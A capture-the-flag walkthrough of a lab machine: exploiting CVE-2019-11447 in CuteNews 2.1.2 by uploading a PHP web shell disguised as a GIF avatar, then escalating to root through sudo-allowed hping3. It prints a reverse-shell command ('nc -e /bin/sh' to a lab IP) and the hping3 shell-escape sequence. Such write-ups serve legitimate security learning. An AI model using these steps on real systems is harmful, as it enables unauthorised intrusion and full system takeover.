## Introduction
*Easy->Intermediate.  
Description: really technical machine, if you are ready for certifications it will be a good tool to test yourself. You will find a very rare final exploit technique, which you have hardly seen before!*

I don't consider myself ready for certifications, so this sounds like an interesting challenge despite being ranked fairly easy. Let's see.

## Ports
We've got a few ports - SSH on 22, HTTP on 80 AND 88, and POP3(S) on 110/995.
Port 80 is Apache, and 88 is nginx.

## Webserver
Running some gobuster on both webservers we find basically nothing on Port 88, but we do get a series of hits on Port 80. The home page is the *Apache2 Debian Default Page* (index.html), but there is also an index.php, which is the login page for [CuteNews](http://cutephp.com/cutenews/) 2.1.2. 

CuteNews 2.1.2 is the subject of [CVE-2019-11447](https://www.cvedetails.com/cve/CVE-2019-11447/), which is an Authenticated RCE vulnerability. However we don't need credentials, because we can register a new account and then do the exploit, so it's pretty bad. It's only rated a 6.5 CVSS score though. Not sure why.

## Exploit
I've actually done this exploit before recently on another platform, so I was somewhat familiar with it - not that it's complicated. In this case we simply register a new account with whatever username and password we want. The only wrinkle is a captcha, and we can get the code at http://192.168.1.88/captcha.php. Once we are authenticated, we can upload some PHP code as an 'avatar' for our account, pretending it is a GIF.

Our request looks like this:

Once this is done we can visit:

{% highlight HTML %}
http://192.168.1.88/uploads/avatar_user_shell.php
{% endhighlight %}

And issue commands like:

``
?cmd=whoami
``

or, more usefully (after starting a listener):

``
http://192.168.1.88/uploads/avatar_user_shell.php?cmd=nc%20-e%20/bin/sh%20192.168.1.77%201234
``

And we're in. 

## Privesc

{% highlight shell %}
User www-data may run the following commands on cute:
    (root) NOPASSWD: /usr/sbin/hping3
{% endhighlight %}

Uh ... ok ... what's **hping3**? Apparently it's some [ping](http://wiki.hping.org/94)-like tool. BUT, it can run TCL scripts, and has an interactive shell mode to do so. If you enter the shell mode you can just enter typical commands, or you can do this:

{% highlight shell %}
www-data@cute:/dev/shm$ sudo -u root /usr/sbin/hping3
sudo -u root /usr/sbin/hping3
hping3> exec /bin/sh <@stdin >@stdout 2>@stderr
exec /bin/sh <@stdin >@stdout 2>@stderr
# whoami
whoami
root
{% endhighlight %}

And we have a typical root prompt. Cool. We are done.
